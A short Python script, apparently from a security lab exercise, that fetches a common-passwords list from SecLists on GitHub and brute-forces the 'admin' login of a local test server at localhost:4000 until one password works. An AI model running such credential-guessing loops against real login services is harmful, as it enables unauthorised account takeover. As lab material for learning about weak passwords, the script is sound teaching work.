import requests
import os
import base64

# test_url = "https://github.com/danielmiessler/SecLists/blob/7fa58a2a2601528c0987aff228ebae780c62aea8/Passwords/Common-Credentials/10k-most-common.txt"

# passwords_github_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/7fa58a2a2601528c0987aff228ebae780c62aea8/Passwords/Common-Credentials/10k-most-common.txt"

url = "https://api.github.com/repos/danielmiessler/SecLists/contents/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt"
headers = {'Accept': 'application/vnd.github.v3.raw'}

os.chdir('lab1')

request = requests.get(url, headers=headers, timeout=5)

if (request.status_code == 200):
    passwords_list = request.text.split("\n")
    for password in passwords_list:
        password = password.strip()
        request2 = requests.get("http://localhost:4000/users?login=admin&pass=" + password)
        if (request2.status_code == 200):
            print(f"Password found: {password}")
            break
else:
    print("Content was not found")